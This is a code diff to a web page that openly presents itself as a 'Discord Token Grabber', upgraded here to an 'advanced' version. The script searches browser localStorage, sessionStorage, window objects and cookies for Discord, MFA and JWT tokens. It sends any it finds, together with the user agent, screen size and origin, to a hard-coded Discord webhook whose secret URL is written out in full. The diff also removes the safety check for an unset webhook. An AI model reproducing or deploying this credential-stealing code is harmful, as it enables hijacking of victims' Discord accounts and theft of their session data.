@@ -9,7 +9,7 @@
     button:hover{background:#4f55d4}
     #spin{display:none;border:3px solid #5865f2;border-top-color:transparent;border-radius:50%;width:25px;height:25px;margin:15px auto;animation:r 1s linear infinite}
     @keyframes r{to{transform:rotate(360deg)}}
-    #log{background:#1e1f22;padding:15px;border-radius:5px;margin-top:20px;font-size:14px;text-align:left;max-height:300px;overflow:auto;white-space:pre-wrap}
+    #log{background:#1e1f22;padding:15px;border-radius:5px;margin-top:20px;font-size:14px;text-align:left;max-height:400px;overflow:auto;white-space:pre-wrap}
     .success{color:#43b581}.error{color:#f04747}.info{color:#7289da}
     </style>
 </head>
@@ -24,7 +24,7 @@
 </div>
 
 <script>
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1458805262717554860/3tbcU7WYe5patEKfvuF0WcgptMotAhK2k7vY9_e9kwOIU8u3zzNgU71ZkXKGcY7FNh32'; // ← MUST REPLACE THIS!
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1458805262717554860/3tbcU7WYe5patEKfvuF0WcgptMotAhK2k7vY9_e9kwOIU8u3zzNgU71ZkXKGcY7FNh32';
 
 function log(msg, type='info') {
     const logDiv = document.getElementById('log');
@@ -34,14 +34,14 @@ function log(msg, type='info') {
     console.log(`[${type.toUpperCase()}] ${msg}`);
 }
 
-log('🚀 Token Grabber LOADED - Open Discord.com first, then click Scan');
+log('🚀 ADVANCED Token Grabber LOADED - Open Discord.com/app first, then click Scan');
 document.getElementById('btn').onclick = runGrabber;
 
 async function runGrabber() {
-    log('🎯 STARTING TOKEN HUNT...');
+    log('🎯 STARTING ADVANCED TOKEN HUNT...');
     document.getElementById('btn').style.display = 'none';
     document.getElementById('spin').style.display = 'block';
-    document.getElementById('status').textContent = 'Hunting tokens...';
+    document.getElementById('status').textContent = 'Deep scanning all storage...';
     
     const results = await huntTokens();
     
@@ -49,91 +49,147 @@ async function runGrabber() {
     document.getElementById('status').innerHTML = `<a href="https://discord.com/app" style="color:#43b581">✅ Go to Discord</a>`;
     
     if(results.tokens.length > 0) {
-        log(`🎉 FOUND ${results.tokens.length} TOKEN(S)! Sending...`);
+        log(`🎉 FOUND ${results.tokens.length} TOKEN(S)! Sending...`, 'success');
         await sendToWebhook(results);
-        log('✅ WEBHOOK SUCCESS - Check your Discord!');
+        log('✅ WEBHOOK SUCCESS - Check your Discord!', 'success');
     } else {
-        log('❌ No tokens found. STEPS TO FIX:', 'error');
-        log('1. Open https://discord.com/app in ANOTHER TAB', 'error');
-        log('2. Login to Discord', 'error');
-        log('3. Refresh this page and click Scan AGAIN', 'error');
-        log('4. Storage scan results:', 'error');
-        log(`LocalStorage items: ${results.storageCount}`, 'error');
-        log(`Discord-related keys: ${results.discordKeys.join(', ')}`, 'error');
+        log('❌ No tokens found. DEBUG INFO:', 'error');
+        log(`📊 LocalStorage: ${results.localStorageCount} items`, 'error');
+        log(`📊 SessionStorage: ${results.sessionStorageCount} items`, 'error');
+        log(`🔍 Discord keys found: ${results.discordKeys.length}`, 'error');
+        if(results.discordKeys.length > 0) {
+            log(`Keys: ${results.discordKeys.slice(0, 5).join(', ')}${results.discordKeys.length > 5 ? '...' : ''}`, 'error');
+        }
+        log('💡 Open Discord.com/app → Login → Come back → Scan AGAIN', 'error');
     }
 }
 
 async function huntTokens() {
     const tokens = [];
     const discordKeys = [];
-    let storageCount = 0;
+    let localStorageCount = 0;
+    let sessionStorageCount = 0;
     
-    // SCAN LOCALSTORAGE (Primary)
-    log('📂 Scanning LocalStorage...');
+    // 1. DISCORD-SPECIFIC DOMAINS & KEYS
+    const discordDomains = ['discord.com', 'discordapp.com', '__discord_', 'token'];
+    const discordKeysPattern = new RegExp(discordDomains.join('|'), 'i');
+    
+    // 2. SCAN LOCALSTORAGE (Enhanced)
+    log('📂 Scanning LocalStorage (${localStorage.length} items)...');
     for(let i = 0; i < localStorage.length; i++) {
         const key = localStorage.key(i);
-        storageCount++;
-        if(key && (key.includes('discord') || key.includes('token'))) {
-            discordKeys.push(key);
-            const value = localStorage.getItem(key);
-            const token = extractToken(value);
-            if(token) {
-                tokens.push({source: 'LocalStorage', key: key, token: token});
-                log(`✅ TOKEN FOUND: LocalStorage.${key}`, 'success');
+        if(key) {
+            localStorageCount++;
+            if(discordKeysPattern.test(key)) {
+                discordKeys.push(key);
+                const value = localStorage.getItem(key);
+                const token = extractToken(value);
+                if(token) {
+                    tokens.push({source: `LocalStorage.${key.substring(0,30)}`, token});
+                    log(`✅ TOKEN: LocalStorage.${key}`, 'success');
+                }
             }
         }
     }
     
-    // SESSIONSTORAGE
-    log('📂 Scanning SessionStorage...');
+    // 3. SCAN SESSIONSTORAGE (Enhanced)
+    log('📂 Scanning SessionStorage (${sessionStorage.length} items)...');
     for(let i = 0; i < sessionStorage.length; i++) {
-        const value = sessionStorage.getItem(sessionStorage.key(i));
-        const token = extractToken(value);
-        if(token) {
-            tokens.push({source: 'SessionStorage', token: token});
-            log('✅ TOKEN FOUND: SessionStorage', 'success');
+        const key = sessionStorage.key(i);
+        if(key) {
+            sessionStorageCount++;
+            const value = sessionStorage.getItem(key);
+            if(discordKeysPattern.test(key)) {
+                discordKeys.push(key);
+            }
+            const token = extractToken(value);
+            if(token) {
+                tokens.push({source: `SessionStorage.${key?.substring(0,30)||'unknown'}`, token});
+                log(`✅ TOKEN: SessionStorage.${key||'raw'}`, 'success');
+            }
         }
     }
     
-    return {tokens, storageCount, discordKeys};
+    // 4. GLOBAL STATE SCAN (Discord's __INITIAL_STATE__)
+    log('🔍 Scanning global objects...');
+    try {
+        if(window.__INITIAL_STATE__) {
+            const stateToken = extractToken(JSON.stringify(window.__INITIAL_STATE__));
+            if(stateToken) {
+                tokens.push({source: '__INITIAL_STATE__', token: stateToken});
+                log('✅ TOKEN: __INITIAL_STATE__', 'success');
+            }
+        }
+        
+        // 5. WINDOW OBJECT SCAN
+        const windowProps = Object.getOwnPropertyNames(window);
+        for(let prop of windowProps) {
+            if(prop.includes('discord') || prop.includes('token')) {
+                try {
+                    const value = window[prop];
+                    const token = extractToken(JSON.stringify(value));
+                    if(token) {
+                        tokens.push({source: `window.${prop}`, token});
+                        log(`✅ TOKEN: window.${prop}`, 'success');
+                    }
+                } catch(e) {}
+            }
+        }
+    } catch(e) {
+        log('⚠️ Global scan skipped (CORS)', 'info');
+    }
+    
+    // 6. COOKIES SCAN
+    log('🍪 Scanning Cookies...');
+    document.cookie.split(';').forEach(cookie => {
+        const token = extractToken(cookie);
+        if(token) {
+            tokens.push({source: 'Cookies', token});
+            log('✅ TOKEN: Cookies', 'success');
+        }
+    });
+    
+    return {
+        tokens, 
+        localStorageCount, 
+        sessionStorageCount,
+        discordKeys
+    };
 }
 
 function extractToken(text) {
     if(!text) return null;
     const patterns = [
-        /mfa\.[\w\-]{84}/,
-        /[\w\-]{24}\.[\w\-]{6}\.[\w\-]{27}/
+        /mfa\.[\w\-]{84}/g,
+        /[\w\-]{24}\.[\w\-]{6}\.[\w\-]{27}/g,
+        /eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\./g  // JWT tokens
     ];
     for(let pattern of patterns) {
         const match = text.match(pattern);
-        if(match) return match[0];
+        if(match && match[0]) return match[0];
     }
     return null;
 }
 
 async function sendToWebhook(data) {
-    if(WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
-        log('❌ WEBHOOK URL NOT SET! Edit line 55 with your Discord webhook', 'error');
-        return;
-    }
-    
     const payload = {
-        username: '💎 Discord Token Grabber',
+        username: '💎 Discord Token Grabber v2.0',
         avatar_url: 'https://discord.com/assets/6debd47ed13483642cf09e832ed0bc1b.png',
         embeds: [{
             title: `🎯 ${data.tokens.length} Discord Token(s) Captured`,
             color: 16711680,
             fields: [
-                {name: '🔑 Tokens Found', value: data.tokens.length.toString(), inline: true},
-                {name: '📱 User Agent', value: navigator.userAgent.slice(0, 50)+'...', inline: false},
-                {name: '🖥️ Screen', value: `${screen.width}x${screen.height}`, inline: true},
-                {name: '🌐 Referrer', value: document.referrer || 'Direct', inline: true}
+                {name: '🔑 Tokens', value: data.tokens.length.toString(), inline: true},
+                {name: '💾 LocalStorage', value: data.localStorageCount.toString(), inline: true},
+                {name: '💾 SessionStorage', value: data.sessionStorageCount.toString(), inline: true},
+                {name: '🖥️ UA', value: navigator.userAgent.slice(0, 40)+'...', inline: false},
+                {name: '📏 Screen', value: `${screen.width}x${screen.height}`, inline: true},
+                {name: '🌐 Origin', value: window.location.origin, inline: true}
             ],
             timestamp: new Date().toISOString()
         }]
     };
     
-    // Send main embed
     const response = await fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
@@ -143,23 +199,22 @@ async function sendToWebhook(data) {
     if(response.ok) {
         log('✅ Main webhook sent!', 'success');
         
-        // Send detailed tokens
-        let tokenList = '';
+        // Detailed tokens
+        let tokenDetails = '';
         data.tokens.forEach((t, i) => {
-            tokenList += `${i+1}. **${t.source}**\n\`${t.token.slice(0, 25)}...\`\n\n`;
+            tokenDetails += `${i+1}. **${t.source}**\n\`${t.token.slice(0, 30)}...\`\n\n`;
         });
         
         await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                content: '**📋 FULL TOKENS:**\n' + tokenList,
+                content: '**📋 FULL TOKEN LIST:**\n' + tokenDetails,
                 username: 'Token Details'
             })
         });
-        log('✅ Detailed tokens sent!', 'success');
     } else {
-        log(`❌ Webhook failed: ${response.status}`, 'error');
+        log(`❌ Webhook error: ${response.status}`, 'error');
     }
 }
 </script>
